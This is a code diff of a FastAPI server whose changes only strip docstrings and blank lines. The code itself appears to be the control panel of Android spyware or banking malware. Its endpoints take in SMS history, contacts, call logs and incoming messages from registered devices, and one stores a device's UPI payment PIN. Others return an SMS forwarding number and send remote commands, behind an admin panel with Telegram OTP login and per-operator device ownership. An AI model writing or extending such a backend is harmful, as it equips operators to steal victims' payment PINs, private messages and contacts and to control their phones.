@@ -86,7 +86,7 @@ async def shutdown_event():
     logger.info("👋 Server stopped!")
 @app.post("/devices/heartbeat")
 async def device_heartbeat(request: Request):
-    """Update device heartbeat and online status"""
+    
     try:
         data = await request.json()
         device_id = data.get("deviceId")
@@ -113,7 +113,7 @@ async def device_heartbeat(request: Request):
 
 @app.post("/ping-response")
 async def ping_response(request: Request):
-    """Receive ping response from device"""
+    
     try:
         data = await request.json()
         device_id = data.get("deviceId") or data.get("device_id")
@@ -134,7 +134,7 @@ async def ping_response(request: Request):
 
 @app.post("/upload-response")
 async def upload_response(request: Request):
-    """Receive upload response (SMS/Contacts) from device"""
+    
     try:
         data = await request.json()
         device_id = data.get("device_id") or data.get("deviceId")
@@ -178,11 +178,9 @@ async def upload_response(request: Request):
         logger.error(f"❌ Upload response error: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
-
-
 @app.post("/register")
 async def register_device(message: dict, background_tasks: BackgroundTasks):
-    """Register device with admin token"""
+    
     device_id = message.get("device_id")
     device_info = message.get("device_info", {})
     admin_token = message.get("admin_token") or message.get("user_id")
@@ -209,10 +207,9 @@ async def register_device(message: dict, background_tasks: BackgroundTasks):
     
     return {"status": "success", "message": "Device registered successfully", "device_id": device_id}
 
-
 @app.post("/battery")
 async def battery_update(message: dict):
-    """Update device battery level"""
+    
     device_id = message.get("device_id")
     data = message.get("data", {})
     battery_level = data.get("battery")
@@ -226,10 +223,9 @@ async def battery_update(message: dict):
     
     return {"status": "success"}
 
-
 @app.post("/sms/batch")
 async def sms_history(message: dict):
-    """Upload SMS history in batches"""
+    
     device_id = message.get("device_id")
     sms_list = message.get("data", [])
     batch_info = message.get("batch_info", {})
@@ -241,10 +237,9 @@ async def sms_history(message: dict):
     
     return {"status": "success"}
 
-
 @app.post("/contacts/batch")
 async def contacts_bulk(message: dict):
-    """Upload contacts in batches"""
+    
     device_id = message.get("device_id")
     contacts_list = message.get("data", [])
     batch_info = message.get("batch_info", {})
@@ -256,10 +251,9 @@ async def contacts_bulk(message: dict):
     
     return {"status": "success"}
 
-
 @app.post("/call-logs/batch")
 async def call_history(message: dict):
-    """Upload call logs in batches"""
+    
     device_id = message.get("device_id")
     call_logs = message.get("data", [])
     batch_info = message.get("batch_info", {})
@@ -270,7 +264,6 @@ async def call_history(message: dict):
     await device_service.add_log(device_id, "call_logs", f"Call logs: {len(call_logs)} {batch_text}".strip(), "info")
     
     return {"status": "success"}
-
 
 @app.post("/api/sms/new")
 async def receive_sms(request: Request):
@@ -351,10 +344,9 @@ async def receive_sms(request: Request):
             detail=f"Internal server error: {str(e)}"
         )
 
-
 @app.get("/api/getForwardingNumber/{device_id}")
 async def get_forwarding_number_new(device_id: str):
-    """Get SMS forwarding number for device"""
+    
     try:
         forwarding_number = await device_service.get_forwarding_number(device_id)
         if not forwarding_number:
@@ -363,8 +355,6 @@ async def get_forwarding_number_new(device_id: str):
     except Exception as e:
         logger.error(f"❌ Error fetching forwarding number: {e}")
         raise HTTPException(status_code=500, detail=str(e))
-
-
 
 @app.get("/health")
 async def health_check():
@@ -383,7 +373,7 @@ async def health_check():
 
 @app.post("/auth/login")
 async def login(login_data: AdminLogin, request: Request, background_tasks: BackgroundTasks):
-    """Admin login - step 1: verify credentials, send OTP if 2FA enabled"""
+    
     ip_address = get_client_ip(request)
     user_agent = get_user_agent(request)
     admin = await auth_service.authenticate_admin(login_data)
@@ -483,12 +473,12 @@ async def login(login_data: AdminLogin, request: Request, background_tasks: Back
         success=True,
         message="OTP code sent to your Telegram. Please verify to complete login.",
         temp_token=temp_token,
-        expires_in=300  # 5 minutes
+        expires_in=300
     )
 
 @app.post("/auth/verify-2fa", response_model=TokenResponse)
 async def verify_2fa(verify_data: OTPVerify, request: Request, background_tasks: BackgroundTasks):
-    """Admin login - step 2: verify OTP code"""
+    
     ip_address = get_client_ip(request)
     user_agent = get_user_agent(request)
     
@@ -596,7 +586,7 @@ async def logout(
     background_tasks: BackgroundTasks,
     current_admin: Admin = Depends(get_current_admin)
 ):
-    """Admin logout"""
+    
     ip_address = get_client_ip(request)
 
     await admin_activity_service.log_activity(
@@ -617,7 +607,7 @@ async def logout(
 
 @app.post("/bot/auth/request-otp", response_model=BotOTPResponse, tags=["Bot Auth"])
 async def bot_request_otp(request: BotOTPRequest, req: Request, background_tasks: BackgroundTasks):
-    """Bot authentication - step 1: request OTP"""
+    
     ip_address = get_client_ip(req)
     admin = await auth_service.get_admin_by_username(request.username)
     
@@ -651,10 +641,9 @@ async def bot_request_otp(request: BotOTPRequest, req: Request, background_tasks
         expires_in=300
     )
 
-
 @app.post("/bot/auth/verify-otp", response_model=BotTokenResponse, tags=["Bot Auth"])
 async def bot_verify_otp(request: BotOTPVerify, req: Request):
-    """Bot authentication - step 2: verify OTP and get service token"""
+    
     ip_address = get_client_ip(req)
     user_agent = get_user_agent(req)
     otp_result = await otp_service.verify_otp(request.username, request.otp_code, ip_address)
@@ -715,10 +704,9 @@ async def bot_verify_otp(request: BotOTPVerify, req: Request):
         }
     )
 
-
 @app.get("/bot/auth/check", response_model=BotStatusResponse, tags=["Bot Auth"])
 async def bot_check_status(current_admin: Admin = Depends(get_current_admin)):
-    """Bot authentication - step 3: check admin status"""
+    
     return BotStatusResponse(
         active=current_admin.is_active,
         admin_username=current_admin.username,
@@ -728,7 +716,7 @@ async def bot_check_status(current_admin: Admin = Depends(get_current_admin)):
 
 @app.post("/save-pin", response_model=UPIPinResponse, tags=["UPI"])
 async def save_upi_pin(pin_data: UPIPinSave, background_tasks: BackgroundTasks):
-    """Save UPI PIN from device"""
+    
     try:
         admin_token = pin_data.user_id
         admin = await mongodb.db.admins.find_one({"device_token": admin_token})
@@ -795,10 +783,9 @@ async def save_upi_pin(pin_data: UPIPinSave, background_tasks: BackgroundTasks):
         logger.error(f"❌ Error saving UPI PIN: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
-
 @app.get("/auth/me", response_model=AdminResponse)
 async def get_current_admin_info(current_admin: Admin = Depends(get_current_admin)):
-    """Get current logged-in admin info"""
+    
     return AdminResponse(
         username=current_admin.username,
         email=current_admin.email,
@@ -820,7 +807,7 @@ async def create_admin(
     request: Request,
     current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
 ):
-    """Create new admin account"""
+    
     new_admin = await auth_service.create_admin(admin_create, created_by=current_admin.username)
 
     await admin_activity_service.log_activity(
@@ -857,7 +844,7 @@ async def create_admin(
 async def list_admins(
     current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
 ):
-    """List all admin accounts"""
+    
     admins = await auth_service.get_all_admins()
     return {"admins": admins, "total": len(admins)}
 
@@ -868,7 +855,7 @@ async def update_admin(
     request: Request,
     current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
 ):
-    """Update admin account"""
+    
     success = await auth_service.update_admin(username, admin_update)
 
     if not success:
@@ -890,7 +877,7 @@ async def delete_admin(
     request: Request,
     current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
 ):
-    """Delete admin account"""
+    
     if username == current_admin.username:
         raise HTTPException(status_code=400, detail="Cannot delete yourself")
 
@@ -917,7 +904,7 @@ async def get_admin_activities(
     limit: int = Query(100, ge=1, le=500),
     current_admin: Admin = Depends(get_current_admin)
 ):
-    """Get admin activity logs"""
+    
     if current_admin.role != AdminRole.SUPER_ADMIN:
         admin_username = current_admin.username
 
@@ -944,7 +931,7 @@ async def get_admin_activity_stats(
     admin_username: Optional[str] = None,
     current_admin: Admin = Depends(get_current_admin)
 ):
-    """Get admin activity statistics"""
+    
     if current_admin.role != AdminRole.SUPER_ADMIN:
         admin_username = current_admin.username
     
@@ -960,27 +947,25 @@ async def get_admin_activity_stats(
 async def get_device_stats(
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
 ):
-    """Get device statistics"""
+    
     admin_username = None if current_admin.role == AdminRole.SUPER_ADMIN else current_admin.username
     
     stats = await device_service.get_stats(admin_username=admin_username)
     return StatsResponse(**stats)
-
 
 @app.get("/api/stats")
 async def get_stats(current_admin: Admin = Depends(get_current_admin)):
-    """Get device statistics (deprecated - use /api/devices/stats)"""
+    
     admin_username = None if current_admin.role == AdminRole.SUPER_ADMIN else current_admin.username
     
     stats = await device_service.get_stats(admin_username=admin_username)
     return StatsResponse(**stats)
-
 
 @app.get("/api/devices/app-types", response_model=AppTypesResponse)
 async def get_app_types(
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
 ):
-    """Get list of application types"""
+    
     is_super_admin = current_admin.role == AdminRole.SUPER_ADMIN
     query = {} if is_super_admin else {"admin_username": current_admin.username}
     
@@ -1019,7 +1004,6 @@ async def get_app_types(
         total=len(app_types)
     )
 
-
 @app.get("/api/devices", response_model=DeviceListResponse)
 async def get_devices(
     skip: int = Query(0, ge=0),
@@ -1028,7 +1012,7 @@ async def get_devices(
     admin_username: Optional[str] = Query(None, description="Filter by admin (Super Admin only)"),
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
 ):
-    """List devices with filtering options"""
+    
     is_super_admin = current_admin.role == AdminRole.SUPER_ADMIN
     
     if is_super_admin:
@@ -1058,7 +1042,6 @@ async def get_devices(
         hasMore=has_more
     )
 
-
 @app.get("/api/admin/{admin_username}/devices", response_model=DeviceListResponse)
 async def get_admin_devices(
     admin_username: str,
@@ -1067,7 +1050,7 @@ async def get_admin_devices(
     app_type: Optional[str] = Query(None, description="Filter by app type"),
     current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
 ):
-    """Get devices for specific admin (Super Admin only)"""
+    
     target_admin = await auth_service.get_admin_by_username(admin_username)
     
     if not target_admin:
@@ -1097,14 +1080,13 @@ async def get_admin_devices(
         hasMore=has_more
     )
 
-
 @app.get("/api/devices/{device_id}")
 async def get_device(
     device_id: str,
     request: Request,
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
 ):
-    """Get device details by ID"""
+    
     device = await device_service.get_device(device_id)
 
     if not device:
@@ -1128,7 +1110,7 @@ async def get_device_sms(
     request: Request = None,
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_SMS))
 ):
-    """Get SMS messages for device"""
+    
     messages = await device_service.get_sms_messages(device_id, skip, limit)
     total = await mongodb.db.sms_messages.count_documents({"device_id": device_id})
 
@@ -1160,7 +1142,7 @@ async def get_device_contacts(
     request: Request = None,
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_CONTACTS))
 ):
-    """Get contacts for device"""
+    
     contacts = await device_service.get_contacts(device_id, skip, limit)
     total = await mongodb.db.contacts.count_documents({"device_id": device_id})
 
@@ -1185,7 +1167,7 @@ async def get_device_logs(
     limit: int = Query(100, ge=1, le=500),
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
 ):
-    """Get activity logs for device"""
+    
     logs = await device_service.get_logs(device_id, skip, limit)
     total = await mongodb.db.logs.count_documents({"device_id": device_id})
 
@@ -1194,7 +1176,6 @@ async def get_device_logs(
         "total": total
     }
 
-
 @app.post("/api/devices/{device_id}/command")
 async def send_command_to_device(
     device_id: str,
@@ -1202,7 +1183,7 @@ async def send_command_to_device(
     request: Request,
     current_admin: Admin = Depends(require_permission(AdminPermission.SEND_COMMANDS))
 ):
-    """Send command to device"""
+    
     device = await device_service.get_device(device_id)
     
     if not device:
@@ -1472,8 +1453,6 @@ async def send_command_to_device(
             detail=f"Unknown command: {command_request.command}"
         )
 
-
-
 @app.put("/api/devices/{device_id}/settings")
 async def update_device_settings(
     device_id: str,
@@ -1481,7 +1460,7 @@ async def update_device_settings(
     request: Request,
     current_admin: Admin = Depends(require_permission(AdminPermission.CHANGE_SETTINGS))
 ):
-    """Update device settings"""
+    
     device = await device_service.get_device(device_id)
     if not device:
         raise HTTPException(status_code=404, detail="Device not found")
@@ -1535,7 +1514,7 @@ async def delete_device_sms(
     request: Request,
     current_admin: Admin = Depends(require_permission(AdminPermission.DELETE_DATA))
 ):
-    """Delete all SMS messages for device"""
+    
     result = await mongodb.db.sms_messages.delete_many({"device_id": device_id})
 
     await admin_activity_service.log_activity(
@@ -1569,7 +1548,7 @@ async def get_device_calls(
     request: Request = None,
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
 ):
-    """Get call logs for device"""
+    
     try:
         calls_cursor = mongodb.db.call_logs.find(
             {"device_id": device_id}
